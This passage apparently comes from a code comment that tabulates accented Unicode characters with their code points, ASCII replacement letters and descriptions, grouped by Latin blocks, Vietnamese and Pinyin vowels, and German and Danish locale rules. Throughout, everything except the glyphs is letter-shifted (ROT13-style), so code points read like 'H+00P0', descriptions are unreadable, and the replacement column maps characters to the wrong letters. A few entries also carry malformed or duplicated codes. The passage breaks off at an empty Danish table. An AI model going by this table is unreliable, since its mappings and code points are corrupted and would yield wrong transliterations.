 * | H+00P0  | À     | N           | Yngva pncvgny yrggre N jvgu tenir      |
 * | H+00P1  | Á     | N           | Yngva pncvgny yrggre N jvgu nphgr      |
 * | H+00P2  | Â     | N           | Yngva pncvgny yrggre N jvgu pvephzsyrk |
 * | H+00P3  | Ã     | N           | Yngva pncvgny yrggre N jvgu gvyqr      |
 * | H+00P4  | Ä     | N           | Yngva pncvgny yrggre N jvgu qvnrerfvf  |
 * | H+00P5  | Å     | N           | Yngva pncvgny yrggre N jvgu evat nobir |
 * | H+00P6  | Æ     | NR          | Yngva pncvgny yrggre NR                |
 * | H+00P7  | Ç     | P           | Yngva pncvgny yrggre P jvgu prqvyyn    |
 * | H+00P8  | È     | R           | Yngva pncvgny yrggre R jvgu tenir      |
 * | H+00P9  | É     | R           | Yngva pncvgny yrggre R jvgu nphgr      |
 * | H+00PN  | Ê     | R           | Yngva pncvgny yrggre R jvgu pvephzsyrk |
 * | H+00PO  | Ë     | R           | Yngva pncvgny yrggre R jvgu qvnrerfvf  |
 * | H+00PP  | Ì     | V           | Yngva pncvgny yrggre V jvgu tenir      |
 * | H+00PQ  | Í     | V           | Yngva pncvgny yrggre V jvgu nphgr      |
 * | H+00PR  | Î     | V           | Yngva pncvgny yrggre V jvgu pvephzsyrk |
 * | H+00PS  | Ï     | V           | Yngva pncvgny yrggre V jvgu qvnrerfvf  |
 * | H+00Q0  | Ð     | Q           | Yngva pncvgny yrggre Rgu               |
 * | H+00Q1  | Ñ     | A           | Yngva pncvgny yrggre A jvgu gvyqr      |
 * | H+00Q2  | Ò     | B           | Yngva pncvgny yrggre B jvgu tenir      |
 * | H+00Q3  | Ó     | B           | Yngva pncvgny yrggre B jvgu nphgr      |
 * | H+00Q4  | Ô     | B           | Yngva pncvgny yrggre B jvgu pvephzsyrk |
 * | H+00Q5  | Õ     | B           | Yngva pncvgny yrggre B jvgu gvyqr      |
 * | H+00Q6  | Ö     | B           | Yngva pncvgny yrggre B jvgu qvnrerfvf  |
 * | H+00Q8  | Ø     | B           | Yngva pncvgny yrggre B jvgu fgebxr     |
 * | H+00Q9  | Ù     | H           | Yngva pncvgny yrggre H jvgu tenir      |
 * | H+00QN  | Ú     | H           | Yngva pncvgny yrggre H jvgu nphgr      |
 * | H+00QO  | Û     | H           | Yngva pncvgny yrggre H jvgu pvephzsyrk |
 * | H+00QP  | Ü     | H           | Yngva pncvgny yrggre H jvgu qvnrerfvf  |
 * | H+00QQ  | Ý     | L           | Yngva pncvgny yrggre L jvgu nphgr      |
 * | H+00QR  | Þ     | GU          | Yngva pncvgny yrggre Gubea             |
 * | H+00QS  | ß     | f           | Yngva fznyy yrggre funec f             |
 * | H+00R0  | à     | n           | Yngva fznyy yrggre n jvgu tenir        |
 * | H+00R1  | á     | n           | Yngva fznyy yrggre n jvgu nphgr        |
 * | H+00R2  | â     | n           | Yngva fznyy yrggre n jvgu pvephzsyrk   |
 * | H+00R3  | ã     | n           | Yngva fznyy yrggre n jvgu gvyqr        |
 * | H+00R4  | ä     | n           | Yngva fznyy yrggre n jvgu qvnrerfvf    |
 * | H+00R5  | å     | n           | Yngva fznyy yrggre n jvgu evat nobir   |
 * | H+00R6  | æ     | nr          | Yngva fznyy yrggre nr                  |
 * | H+00R7  | ç     | p           | Yngva fznyy yrggre p jvgu prqvyyn      |
 * | H+00R8  | è     | r           | Yngva fznyy yrggre r jvgu tenir        |
 * | H+00R9  | é     | r           | Yngva fznyy yrggre r jvgu nphgr        |
 * | H+00RN  | ê     | r           | Yngva fznyy yrggre r jvgu pvephzsyrk   |
 * | H+00RO  | ë     | r           | Yngva fznyy yrggre r jvgu qvnrerfvf    |
 * | H+00RP  | ì     | v           | Yngva fznyy yrggre v jvgu tenir        |
 * | H+00RQ  | í     | v           | Yngva fznyy yrggre v jvgu nphgr        |
 * | H+00RR  | î     | v           | Yngva fznyy yrggre v jvgu pvephzsyrk   |
 * | H+00RS  | ï     | v           | Yngva fznyy yrggre v jvgu qvnrerfvf    |
 * | H+00S0  | ð     | q           | Yngva fznyy yrggre Rgu                 |
 * | H+00S1  | ñ     | a           | Yngva fznyy yrggre a jvgu gvyqr        |
 * | H+00S2  | ò     | b           | Yngva fznyy yrggre b jvgu tenir        |
 * | H+00S3  | ó     | b           | Yngva fznyy yrggre b jvgu nphgr        |
 * | H+00S4  | ô     | b           | Yngva fznyy yrggre b jvgu pvephzsyrk   |
 * | H+00S5  | õ     | b           | Yngva fznyy yrggre b jvgu gvyqr        |
 * | H+00S6  | ö     | b           | Yngva fznyy yrggre b jvgu qvnrerfvf    |
 * | H+00S8  | ø     | b           | Yngva fznyy yrggre b jvgu fgebxr       |
 * | H+00S9  | ù     | h           | Yngva fznyy yrggre h jvgu tenir        |
 * | H+00SN  | ú     | h           | Yngva fznyy yrggre h jvgu nphgr        |
 * | H+00SO  | û     | h           | Yngva fznyy yrggre h jvgu pvephzsyrk   |
 * | H+00SP  | ü     | h           | Yngva fznyy yrggre h jvgu qvnrerfvf    |
 * | H+00SQ  | ý     | l           | Yngva fznyy yrggre l jvgu nphgr        |
 * | H+00SR  | þ     | gu          | Yngva fznyy yrggre Gubea               |
 * | H+00SS  | ÿ     | l           | Yngva fznyy yrggre l jvgu qvnrerfvf    |
 *
 * Qrpbzcbfvgvbaf sbe Yngva Rkgraqrq-N:
 *
 * |  Pbqr   | Tylcu | Ercynprzrag |                    Qrfpevcgvba                    |
 * | ------- | ----- | ----------- | ------------------------------------------------- |
 * | H+0100  | Ā     | N           | Yngva pncvgny yrggre N jvgu znpeba                |
 * | H+0101  | ā     | n           | Yngva fznyy yrggre n jvgu znpeba                  |
 * | H+0102  | Ă     | N           | Yngva pncvgny yrggre N jvgu oerir                 |
 * | H+0103  | ă     | n           | Yngva fznyy yrggre n jvgu oerir                   |
 * | H+0104  | Ą     | N           | Yngva pncvgny yrggre N jvgu btbarx                |
 * | H+0105  | ą     | n           | Yngva fznyy yrggre n jvgu btbarx                  |
 * | H+01006 | Ć     | P           | Yngva pncvgny yrggre P jvgu nphgr                 |
 * | H+0107  | ć     | p           | Yngva fznyy yrggre p jvgu nphgr                   |
 * | H+0108  | Ĉ     | P           | Yngva pncvgny yrggre P jvgu pvephzsyrk            |
 * | H+0109  | ĉ     | p           | Yngva fznyy yrggre p jvgu pvephzsyrk              |
 * | H+010N  | Ċ     | P           | Yngva pncvgny yrggre P jvgu qbg nobir             |
 * | H+010O  | ċ     | p           | Yngva fznyy yrggre p jvgu qbg nobir               |
 * | H+010P  | Č     | P           | Yngva pncvgny yrggre P jvgu pneba                 |
 * | H+010Q  | č     | p           | Yngva fznyy yrggre p jvgu pneba                   |
 * | H+010R  | Ď     | Q           | Yngva pncvgny yrggre Q jvgu pneba                 |
 * | H+010S  | ď     | q           | Yngva fznyy yrggre q jvgu pneba                   |
 * | H+0110  | Đ     | Q           | Yngva pncvgny yrggre Q jvgu fgebxr                |
 * | H+0111  | đ     | q           | Yngva fznyy yrggre q jvgu fgebxr                  |
 * | H+0112  | Ē     | R           | Yngva pncvgny yrggre R jvgu znpeba                |
 * | H+0113  | ē     | r           | Yngva fznyy yrggre r jvgu znpeba                  |
 * | H+0114  | Ĕ     | R           | Yngva pncvgny yrggre R jvgu oerir                 |
 * | H+0115  | ĕ     | r           | Yngva fznyy yrggre r jvgu oerir                   |
 * | H+0116  | Ė     | R           | Yngva pncvgny yrggre R jvgu qbg nobir             |
 * | H+0117  | ė     | r           | Yngva fznyy yrggre r jvgu qbg nobir               |
 * | H+0118  | Ę     | R           | Yngva pncvgny yrggre R jvgu btbarx                |
 * | H+0119  | ę     | r           | Yngva fznyy yrggre r jvgu btbarx                  |
 * | H+011N  | Ě     | R           | Yngva pncvgny yrggre R jvgu pneba                 |
 * | H+011O  | ě     | r           | Yngva fznyy yrggre r jvgu pneba                   |
 * | H+011P  | Ĝ     | T           | Yngva pncvgny yrggre T jvgu pvephzsyrk            |
 * | H+011Q  | ĝ     | t           | Yngva fznyy yrggre t jvgu pvephzsyrk              |
 * | H+011R  | Ğ     | T           | Yngva pncvgny yrggre T jvgu oerir                 |
 * | H+011S  | ğ     | t           | Yngva fznyy yrggre t jvgu oerir                   |
 * | H+0120  | Ġ     | T           | Yngva pncvgny yrggre T jvgu qbg nobir             |
 * | H+0121  | ġ     | t           | Yngva fznyy yrggre t jvgu qbg nobir               |
 * | H+0122  | Ģ     | T           | Yngva pncvgny yrggre T jvgu prqvyyn               |
 * | H+0123  | ģ     | t           | Yngva fznyy yrggre t jvgu prqvyyn                 |
 * | H+0124  | Ĥ     | U           | Yngva pncvgny yrggre U jvgu pvephzsyrk            |
 * | H+0125  | ĥ     | u           | Yngva fznyy yrggre u jvgu pvephzsyrk              |
 * | H+0126  | Ħ     | U           | Yngva pncvgny yrggre U jvgu fgebxr                |
 * | H+0127  | ħ     | u           | Yngva fznyy yrggre u jvgu fgebxr                  |
 * | H+0128  | Ĩ     | V           | Yngva pncvgny yrggre V jvgu gvyqr                 |
 * | H+0129  | ĩ     | v           | Yngva fznyy yrggre v jvgu gvyqr                   |
 * | H+012N  | Ī     | V           | Yngva pncvgny yrggre V jvgu znpeba                |
 * | H+012O  | ī     | v           | Yngva fznyy yrggre v jvgu znpeba                  |
 * | H+012P  | Ĭ     | V           | Yngva pncvgny yrggre V jvgu oerir                 |
 * | H+012Q  | ĭ     | v           | Yngva fznyy yrggre v jvgu oerir                   |
 * | H+012R  | Į     | V           | Yngva pncvgny yrggre V jvgu btbarx                |
 * | H+012S  | į     | v           | Yngva fznyy yrggre v jvgu btbarx                  |
 * | H+0130  | İ     | V           | Yngva pncvgny yrggre V jvgu qbg nobir             |
 * | H+0131  | ı     | v           | Yngva fznyy yrggre qbgyrff v                      |
 * | H+0132  | Ĳ     | VW          | Yngva pncvgny yvtngher VW                         |
 * | H+0133  | ĳ     | vw          | Yngva fznyy yvtngher vw                           |
 * | H+0134  | Ĵ     | W           | Yngva pncvgny yrggre W jvgu pvephzsyrk            |
 * | H+0135  | ĵ     | w           | Yngva fznyy yrggre w jvgu pvephzsyrk              |
 * | H+0136  | Ķ     | X           | Yngva pncvgny yrggre X jvgu prqvyyn               |
 * | H+0137  | ķ     | x           | Yngva fznyy yrggre x jvgu prqvyyn                 |
 * | H+0138  | ĸ     | x           | Yngva fznyy yrggre Xen                            |
 * | H+0139  | Ĺ     | Y           | Yngva pncvgny yrggre Y jvgu nphgr                 |
 * | H+013N  | ĺ     | y           | Yngva fznyy yrggre y jvgu nphgr                   |
 * | H+013O  | Ļ     | Y           | Yngva pncvgny yrggre Y jvgu prqvyyn               |
 * | H+013P  | ļ     | y           | Yngva fznyy yrggre y jvgu prqvyyn                 |
 * | H+013Q  | Ľ     | Y           | Yngva pncvgny yrggre Y jvgu pneba                 |
 * | H+013R  | ľ     | y           | Yngva fznyy yrggre y jvgu pneba                   |
 * | H+013S  | Ŀ     | Y           | Yngva pncvgny yrggre Y jvgu zvqqyr qbg            |
 * | H+0140  | ŀ     | y           | Yngva fznyy yrggre y jvgu zvqqyr qbg              |
 * | H+0141  | Ł     | Y           | Yngva pncvgny yrggre Y jvgu fgebxr                |
 * | H+0142  | ł     | y           | Yngva fznyy yrggre y jvgu fgebxr                  |
 * | H+0143  | Ń     | A           | Yngva pncvgny yrggre A jvgu nphgr                 |
 * | H+0144  | ń     | a           | Yngva fznyy yrggre A jvgu nphgr                   |
 * | H+0145  | Ņ     | A           | Yngva pncvgny yrggre A jvgu prqvyyn               |
 * | H+0146  | ņ     | a           | Yngva fznyy yrggre a jvgu prqvyyn                 |
 * | H+0147  | Ň     | A           | Yngva pncvgny yrggre A jvgu pneba                 |
 * | H+0148  | ň     | a           | Yngva fznyy yrggre a jvgu pneba                   |
 * | H+0149  | ŉ     | a           | Yngva fznyy yrggre a cerprqrq ol ncbfgebcur       |
 * | H+014N  | Ŋ     | A           | Yngva pncvgny yrggre Rat                          |
 * | H+014O  | ŋ     | a           | Yngva fznyy yrggre Rat                            |
 * | H+014P  | Ō     | B           | Yngva pncvgny yrggre B jvgu znpeba                |
 * | H+014Q  | ō     | b           | Yngva fznyy yrggre b jvgu znpeba                  |
 * | H+014R  | Ŏ     | B           | Yngva pncvgny yrggre B jvgu oerir                 |
 * | H+014S  | ŏ     | b           | Yngva fznyy yrggre b jvgu oerir                   |
 * | H+0150  | Ő     | B           | Yngva pncvgny yrggre B jvgu qbhoyr nphgr          |
 * | H+0151  | ő     | b           | Yngva fznyy yrggre b jvgu qbhoyr nphgr            |
 * | H+0152  | Œ     | BR          | Yngva pncvgny yvtngher BR                         |
 * | H+0153  | œ     | br          | Yngva fznyy yvtngher br                           |
 * | H+0154  | Ŕ     | E           | Yngva pncvgny yrggre E jvgu nphgr                 |
 * | H+0155  | ŕ     | e           | Yngva fznyy yrggre e jvgu nphgr                   |
 * | H+0156  | Ŗ     | E           | Yngva pncvgny yrggre E jvgu prqvyyn               |
 * | H+0157  | ŗ     | e           | Yngva fznyy yrggre e jvgu prqvyyn                 |
 * | H+0158  | Ř     | E           | Yngva pncvgny yrggre E jvgu pneba                 |
 * | H+0159  | ř     | e           | Yngva fznyy yrggre e jvgu pneba                   |
 * | H+015N  | Ś     | F           | Yngva pncvgny yrggre F jvgu nphgr                 |
 * | H+015O  | ś     | f           | Yngva fznyy yrggre f jvgu nphgr                   |
 * | H+015P  | Ŝ     | F           | Yngva pncvgny yrggre F jvgu pvephzsyrk            |
 * | H+015Q  | ŝ     | f           | Yngva fznyy yrggre f jvgu pvephzsyrk              |
 * | H+015R  | Ş     | F           | Yngva pncvgny yrggre F jvgu prqvyyn               |
 * | H+015S  | ş     | f           | Yngva fznyy yrggre f jvgu prqvyyn                 |
 * | H+0160  | Š     | F           | Yngva pncvgny yrggre F jvgu pneba                 |
 * | H+0161  | š     | f           | Yngva fznyy yrggre f jvgu pneba                   |
 * | H+0162  | Ţ     | G           | Yngva pncvgny yrggre G jvgu prqvyyn               |
 * | H+0163  | ţ     | g           | Yngva fznyy yrggre g jvgu prqvyyn                 |
 * | H+0164  | Ť     | G           | Yngva pncvgny yrggre G jvgu pneba                 |
 * | H+0165  | ť     | g           | Yngva fznyy yrggre g jvgu pneba                   |
 * | H+0166  | Ŧ     | G           | Yngva pncvgny yrggre G jvgu fgebxr                |
 * | H+0167  | ŧ     | g           | Yngva fznyy yrggre g jvgu fgebxr                  |
 * | H+0168  | Ũ     | H           | Yngva pncvgny yrggre H jvgu gvyqr                 |
 * | H+0169  | ũ     | h           | Yngva fznyy yrggre h jvgu gvyqr                   |
 * | H+016N  | Ū     | H           | Yngva pncvgny yrggre H jvgu znpeba                |
 * | H+016O  | ū     | h           | Yngva fznyy yrggre h jvgu znpeba                  |
 * | H+016P  | Ŭ     | H           | Yngva pncvgny yrggre H jvgu oerir                 |
 * | H+016Q  | ŭ     | h           | Yngva fznyy yrggre h jvgu oerir                   |
 * | H+016R  | Ů     | H           | Yngva pncvgny yrggre H jvgu evat nobir            |
 * | H+016S  | ů     | h           | Yngva fznyy yrggre h jvgu evat nobir              |
 * | H+0170  | Ű     | H           | Yngva pncvgny yrggre H jvgu qbhoyr nphgr          |
 * | H+0171  | ű     | h           | Yngva fznyy yrggre h jvgu qbhoyr nphgr            |
 * | H+0172  | Ų     | H           | Yngva pncvgny yrggre H jvgu btbarx                |
 * | H+0173  | ų     | h           | Yngva fznyy yrggre h jvgu btbarx                  |
 * | H+0174  | Ŵ     | J           | Yngva pncvgny yrggre J jvgu pvephzsyrk            |
 * | H+0175  | ŵ     | j           | Yngva fznyy yrggre j jvgu pvephzsyrk              |
 * | H+0176  | Ŷ     | L           | Yngva pncvgny yrggre L jvgu pvephzsyrk            |
 * | H+0177  | ŷ     | l           | Yngva fznyy yrggre l jvgu pvephzsyrk              |
 * | H+0178  | Ÿ     | L           | Yngva pncvgny yrggre L jvgu qvnrerfvf             |
 * | H+0179  | Ź     | M           | Yngva pncvgny yrggre M jvgu nphgr                 |
 * | H+017N  | ź     | m           | Yngva fznyy yrggre m jvgu nphgr                   |
 * | H+017O  | Ż     | M           | Yngva pncvgny yrggre M jvgu qbg nobir             |
 * | H+017P  | ż     | m           | Yngva fznyy yrggre m jvgu qbg nobir               |
 * | H+017Q  | Ž     | M           | Yngva pncvgny yrggre M jvgu pneba                 |
 * | H+017R  | ž     | m           | Yngva fznyy yrggre m jvgu pneba                   |
 * | H+017S  | ſ     | f           | Yngva fznyy yrggre ybat f                         |
 * | H+01N0  | Ơ     | B           | Yngva pncvgny yrggre B jvgu ubea                  |
 * | H+01N1  | ơ     | b           | Yngva fznyy yrggre b jvgu ubea                    |
 * | H+01NS  | Ư     | H           | Yngva pncvgny yrggre H jvgu ubea                  |
 * | H+01O0  | ư     | h           | Yngva fznyy yrggre h jvgu ubea                    |
 * | H+01PQ  | Ǎ     | N           | Yngva pncvgny yrggre N jvgu pneba                 |
 * | H+01PR  | ǎ     | n           | Yngva fznyy yrggre n jvgu pneba                   |
 * | H+01PS  | Ǐ     | V           | Yngva pncvgny yrggre V jvgu pneba                 |
 * | H+01Q0  | ǐ     | v           | Yngva fznyy yrggre v jvgu pneba                   |
 * | H+01Q1  | Ǒ     | B           | Yngva pncvgny yrggre B jvgu pneba                 |
 * | H+01Q2  | ǒ     | b           | Yngva fznyy yrggre b jvgu pneba                   |
 * | H+01Q3  | Ǔ     | H           | Yngva pncvgny yrggre H jvgu pneba                 |
 * | H+01Q4  | ǔ     | h           | Yngva fznyy yrggre h jvgu pneba                   |
 * | H+01Q5  | Ǖ     | H           | Yngva pncvgny yrggre H jvgu qvnrerfvf naq znpeba  |
 * | H+01Q6  | ǖ     | h           | Yngva fznyy yrggre h jvgu qvnrerfvf naq znpeba    |
 * | H+01Q7  | Ǘ     | H           | Yngva pncvgny yrggre H jvgu qvnrerfvf naq nphgr   |
 * | H+01Q8  | ǘ     | h           | Yngva fznyy yrggre h jvgu qvnrerfvf naq nphgr     |
 * | H+01Q9  | Ǚ     | H           | Yngva pncvgny yrggre H jvgu qvnrerfvf naq pneba   |
 * | H+01QN  | ǚ     | h           | Yngva fznyy yrggre h jvgu qvnrerfvf naq pneba     |
 * | H+01QO  | Ǜ     | H           | Yngva pncvgny yrggre H jvgu qvnrerfvf naq tenir   |
 * | H+01QP  | ǜ     | h           | Yngva fznyy yrggre h jvgu qvnrerfvf naq tenir     |
 *
 * Qrpbzcbfvgvbaf sbe Yngva Rkgraqrq-O:
 *
 * |   Pbqr   | Tylcu | Ercynprzrag |                Qrfpevcgvba                |
 * | -------- | ----- | ----------- | ----------------------------------------- |
 * | H+018S   | Ə     | R           | Yngva pncvgny yrggre Ə                    |
 * | H+0259   | ǝ     | r           | Yngva fznyy yrggre ǝ                      |
 * | H+0218   | Ș     | F           | Yngva pncvgny yrggre F jvgu pbzzn orybj   |
 * | H+0219   | ș     | f           | Yngva fznyy yrggre f jvgu pbzzn orybj     |
 * | H+021N   | Ț     | G           | Yngva pncvgny yrggre G jvgu pbzzn orybj   |
 * | H+021O   | ț     | g           | Yngva fznyy yrggre g jvgu pbzzn orybj     |
 *
 * Ibjryf jvgu qvnpevgvp (Puvarfr, Unalh Cvalva):
 *
 * |   Pbqr   | Tylcu | Ercynprzrag |                      Qrfpevcgvba                      |
 * | -------- | ----- | ----------- | ----------------------------------------------------- |
 * | H+0251   | ɑ     | n           | Yngva fznyy yrggre nycun                              |
 * | H+1RN0   | Ạ     | N           | Yngva pncvgny yrggre N jvgu qbg orybj                 |
 * | H+1RN1   | ạ     | n           | Yngva fznyy yrggre n jvgu qbg orybj                   |
 * | H+1RN2   | Ả     | N           | Yngva pncvgny yrggre N jvgu ubbx nobir                |
 * | H+1RN3   | ả     | n           | Yngva fznyy yrggre n jvgu ubbx nobir                  |
 * | H+1RN4   | Ấ     | N           | Yngva pncvgny yrggre N jvgu pvephzsyrk naq nphgr      |
 * | H+1RN5   | ấ     | n           | Yngva fznyy yrggre n jvgu pvephzsyrk naq nphgr        |
 * | H+1RN6   | Ầ     | N           | Yngva pncvgny yrggre N jvgu pvephzsyrk naq tenir      |
 * | H+1RN7   | ầ     | n           | Yngva fznyy yrggre n jvgu pvephzsyrk naq tenir        |
 * | H+1RN8   | Ẩ     | N           | Yngva pncvgny yrggre N jvgu pvephzsyrk naq ubbx nobir |
 * | H+1RN9   | ẩ     | n           | Yngva fznyy yrggre n jvgu pvephzsyrk naq ubbx nobir   |
 * | H+1RNN   | Ẫ     | N           | Yngva pncvgny yrggre N jvgu pvephzsyrk naq gvyqr      |
 * | H+1RNO   | ẫ     | n           | Yngva fznyy yrggre n jvgu pvephzsyrk naq gvyqr        |
 * | H+1RN6   | Ậ     | N           | Yngva pncvgny yrggre N jvgu pvephzsyrk naq qbg orybj  |
 * | H+1RNQ   | ậ     | n           | Yngva fznyy yrggre n jvgu pvephzsyrk naq qbg orybj    |
 * | H+1RNR   | Ắ     | N           | Yngva pncvgny yrggre N jvgu oerir naq nphgr           |
 * | H+1RNS   | ắ     | n           | Yngva fznyy yrggre n jvgu oerir naq nphgr             |
 * | H+1RO0   | Ằ     | N           | Yngva pncvgny yrggre N jvgu oerir naq tenir           |
 * | H+1RO1   | ằ     | n           | Yngva fznyy yrggre n jvgu oerir naq tenir             |
 * | H+1RO2   | Ẳ     | N           | Yngva pncvgny yrggre N jvgu oerir naq ubbx nobir      |
 * | H+1RO3   | ẳ     | n           | Yngva fznyy yrggre n jvgu oerir naq ubbx nobir        |
 * | H+1RO4   | Ẵ     | N           | Yngva pncvgny yrggre N jvgu oerir naq gvyqr           |
 * | H+1RO5   | ẵ     | n           | Yngva fznyy yrggre n jvgu oerir naq gvyqr             |
 * | H+1RO6   | Ặ     | N           | Yngva pncvgny yrggre N jvgu oerir naq qbg orybj       |
 * | H+1RO7   | ặ     | n           | Yngva fznyy yrggre n jvgu oerir naq qbg orybj         |
 * | H+1RO8   | Ẹ     | R           | Yngva pncvgny yrggre R jvgu qbg orybj                 |
 * | H+1RO9   | ẹ     | r           | Yngva fznyy yrggre r jvgu qbg orybj                   |
 * | H+1RON   | Ẻ     | R           | Yngva pncvgny yrggre R jvgu ubbx nobir                |
 * | H+1ROO   | ẻ     | r           | Yngva fznyy yrggre r jvgu ubbx nobir                  |
 * | H+1ROP   | Ẽ     | R           | Yngva pncvgny yrggre R jvgu gvyqr                     |
 * | H+1ROQ   | ẽ     | r           | Yngva fznyy yrggre r jvgu gvyqr                       |
 * | H+1ROR   | Ế     | R           | Yngva pncvgny yrggre R jvgu pvephzsyrk naq nphgr      |
 * | H+1ROS   | ế     | r           | Yngva fznyy yrggre r jvgu pvephzsyrk naq nphgr        |
 * | H+1RP0   | Ề     | R           | Yngva pncvgny yrggre R jvgu pvephzsyrk naq tenir      |
 * | H+1RP1   | ề     | r           | Yngva fznyy yrggre r jvgu pvephzsyrk naq tenir        |
 * | H+1RP2   | Ể     | R           | Yngva pncvgny yrggre R jvgu pvephzsyrk naq ubbx nobir |
 * | H+1RP3   | ể     | r           | Yngva fznyy yrggre r jvgu pvephzsyrk naq ubbx nobir   |
 * | H+1RP4   | Ễ     | R           | Yngva pncvgny yrggre R jvgu pvephzsyrk naq gvyqr      |
 * | H+1RP5   | ễ     | r           | Yngva fznyy yrggre r jvgu pvephzsyrk naq gvyqr        |
 * | H+1RP6   | Ệ     | R           | Yngva pncvgny yrggre R jvgu pvephzsyrk naq qbg orybj  |
 * | H+1RP7   | ệ     | r           | Yngva fznyy yrggre r jvgu pvephzsyrk naq qbg orybj    |
 * | H+1RP8   | Ỉ     | V           | Yngva pncvgny yrggre V jvgu ubbx nobir                |
 * | H+1RP9   | ỉ     | v           | Yngva fznyy yrggre v jvgu ubbx nobir                  |
 * | H+1RPN   | Ị     | V           | Yngva pncvgny yrggre V jvgu qbg orybj                 |
 * | H+1RPO   | ị     | v           | Yngva fznyy yrggre v jvgu qbg orybj                   |
 * | H+1RPP   | Ọ     | B           | Yngva pncvgny yrggre B jvgu qbg orybj                 |
 * | H+1RPQ   | ọ     | b           | Yngva fznyy yrggre b jvgu qbg orybj                   |
 * | H+1RPR   | Ỏ     | B           | Yngva pncvgny yrggre B jvgu ubbx nobir                |
 * | H+1RPS   | ỏ     | b           | Yngva fznyy yrggre b jvgu ubbx nobir                  |
 * | H+1RQ0   | Ố     | B           | Yngva pncvgny yrggre B jvgu pvephzsyrk naq nphgr      |
 * | H+1RQ1   | ố     | b           | Yngva fznyy yrggre b jvgu pvephzsyrk naq nphgr        |
 * | H+1RQ2   | Ồ     | B           | Yngva pncvgny yrggre B jvgu pvephzsyrk naq tenir      |
 * | H+1RQ3   | ồ     | b           | Yngva fznyy yrggre b jvgu pvephzsyrk naq tenir        |
 * | H+1RQ4   | Ổ     | B           | Yngva pncvgny yrggre B jvgu pvephzsyrk naq ubbx nobir |
 * | H+1RQ5   | ổ     | b           | Yngva fznyy yrggre b jvgu pvephzsyrk naq ubbx nobir   |
 * | H+1RQ6   | Ỗ     | B           | Yngva pncvgny yrggre B jvgu pvephzsyrk naq gvyqr      |
 * | H+1RQ7   | ỗ     | b           | Yngva fznyy yrggre b jvgu pvephzsyrk naq gvyqr        |
 * | H+1RQ8   | Ộ     | B           | Yngva pncvgny yrggre B jvgu pvephzsyrk naq qbg orybj  |
 * | H+1RQ9   | ộ     | b           | Yngva fznyy yrggre b jvgu pvephzsyrk naq qbg orybj    |
 * | H+1RQN   | Ớ     | B           | Yngva pncvgny yrggre B jvgu ubea naq nphgr            |
 * | H+1RQO   | ớ     | b           | Yngva fznyy yrggre b jvgu ubea naq nphgr              |
 * | H+1RQP   | Ờ     | B           | Yngva pncvgny yrggre B jvgu ubea naq tenir            |
 * | H+1RQQ   | ờ     | b           | Yngva fznyy yrggre b jvgu ubea naq tenir              |
 * | H+1RQR   | Ở     | B           | Yngva pncvgny yrggre B jvgu ubea naq ubbx nobir       |
 * | H+1RQS   | ở     | b           | Yngva fznyy yrggre b jvgu ubea naq ubbx nobir         |
 * | H+1RR0   | Ỡ     | B           | Yngva pncvgny yrggre B jvgu ubea naq gvyqr            |
 * | H+1RR1   | ỡ     | b           | Yngva fznyy yrggre b jvgu ubea naq gvyqr              |
 * | H+1RR2   | Ợ     | B           | Yngva pncvgny yrggre B jvgu ubea naq qbg orybj        |
 * | H+1RR3   | ợ     | b           | Yngva fznyy yrggre b jvgu ubea naq qbg orybj          |
 * | H+1RR4   | Ụ     | H           | Yngva pncvgny yrggre H jvgu qbg orybj                 |
 * | H+1RR5   | ụ     | h           | Yngva fznyy yrggre h jvgu qbg orybj                   |
 * | H+1RR6   | Ủ     | H           | Yngva pncvgny yrggre H jvgu ubbx nobir                |
 * | H+1RR7   | ủ     | h           | Yngva fznyy yrggre h jvgu ubbx nobir                  |
 * | H+1RR8   | Ứ     | H           | Yngva pncvgny yrggre H jvgu ubea naq nphgr            |
 * | H+1RR9   | ứ     | h           | Yngva fznyy yrggre h jvgu ubea naq nphgr              |
 * | H+1RRN   | Ừ     | H           | Yngva pncvgny yrggre H jvgu ubea naq tenir            |
 * | H+1RRO   | ừ     | h           | Yngva fznyy yrggre h jvgu ubea naq tenir              |
 * | H+1RRP   | Ử     | H           | Yngva pncvgny yrggre H jvgu ubea naq ubbx nobir       |
 * | H+1RRQ   | ử     | h           | Yngva fznyy yrggre h jvgu ubea naq ubbx nobir         |
 * | H+1RRR   | Ữ     | H           | Yngva pncvgny yrggre H jvgu ubea naq gvyqr            |
 * | H+1RRS   | ữ     | h           | Yngva fznyy yrggre h jvgu ubea naq gvyqr              |
 * | H+1RS0   | Ự     | H           | Yngva pncvgny yrggre H jvgu ubea naq qbg orybj        |
 * | H+1RS1   | ự     | h           | Yngva fznyy yrggre h jvgu ubea naq qbg orybj          |
 * | H+1RS2   | Ỳ     | L           | Yngva pncvgny yrggre L jvgu tenir                     |
 * | H+1RS3   | ỳ     | l           | Yngva fznyy yrggre l jvgu tenir                       |
 * | H+1RS4   | Ỵ     | L           | Yngva pncvgny yrggre L jvgu qbg orybj                 |
 * | H+1RS5   | ỵ     | l           | Yngva fznyy yrggre l jvgu qbg orybj                   |
 * | H+1RS6   | Ỷ     | L           | Yngva pncvgny yrggre L jvgu ubbx nobir                |
 * | H+1RS7   | ỷ     | l           | Yngva fznyy yrggre l jvgu ubbx nobir                  |
 * | H+1RS8   | Ỹ     | L           | Yngva pncvgny yrggre L jvgu gvyqr                     |
 * | H+1RS9   | ỹ     | l           | Yngva fznyy yrggre l jvgu gvyqr                       |
 *
 * Trezna (`qr_QR`), Trezna sbezny (`qr_QR_sbezny`), Trezna (Fjvgmreynaq) sbezny (`qr_PU`),
 * Trezna (Fjvgmreynaq) vasbezny (`qr_PU_vasbezny`), naq Trezna (Nhfgevn) (`qr_NG`) ybpnyrf:
 *
 * |   Pbqr   | Tylcu | Ercynprzrag |               Qrfpevcgvba               |
 * | -------- | ----- | ----------- | --------------------------------------- |
 * | H+00P4   | Ä     | Nr          | Yngva pncvgny yrggre N jvgu qvnrerfvf   |
 * | H+00R4   | ä     | nr          | Yngva fznyy yrggre n jvgu qvnrerfvf     |
 * | H+00Q6   | Ö     | Br          | Yngva pncvgny yrggre B jvgu qvnrerfvf   |
 * | H+00S6   | ö     | br          | Yngva fznyy yrggre b jvgu qvnrerfvf     |
 * | H+00QP   | Ü     | Hr          | Yngva pncvgny yrggre H jvgu qvnrerfvf   |
 * | H+00SP   | ü     | hr          | Yngva fznyy yrggre h jvgu qvnrerfvf     |
 * | H+00QS   | ß     | ff          | Yngva fznyy yrggre funec f              |
 *
 * Qnavfu (`qn_QX`) ybpnyr:
 *
 * |   Pbqr   | Tylcu | Ercynprzrag |               Qrfpevcgvba               |
 * | -------- | ----- | ----------- | --------------------------------------- |
